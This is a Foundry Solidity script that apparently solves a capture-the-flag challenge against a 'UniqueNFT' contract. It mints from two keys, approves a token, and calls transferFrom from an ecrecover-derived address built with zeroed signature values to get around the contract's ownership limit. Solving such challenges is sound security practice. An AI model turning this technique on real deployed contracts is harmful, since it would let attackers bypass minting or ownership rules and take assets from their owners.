// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Script, console} from "forge-std/Script.sol";
import { UniqueNFT } from "../src/UniqueNFT.sol";

contract UniqueNFTSolver is Script {

	// UniqueNFT public instance = UniqueNFT(0x6b4DDbd0bdb3332f4B9512789fA827826Ccbaa88);
	UniqueNFT public instance = new UniqueNFT();

	uint256 prv = vm.envUint("PRV");
	uint256 prv1 = vm.envUint("PRV1");
	address me = vm.envAddress("PUB");

	function run() external {
		vm.startBroadcast(prv1);

		
		
		uint256 minted = instance.mintNFTEOA();
		instance.approve(me, minted);

		

		vm.stopBroadcast();
	


		vm.startBroadcast(prv);

		instance.mintNFTEOA();
		console.logBytes32(bytes32(instance.balanceOf(me)));

		(uint8 v, bytes32 r, bytes32 s) = vm.sign(prv1, keccak256("msg"));
		address helper = ecrecover(keccak256("msg"), v, 0, 0);
		console.log(helper);
		instance.transferFrom(helper, me, minted+1);


		console.logBytes32(bytes32(instance.balanceOf(me)));

		vm.stopBroadcast();
	
	}

}

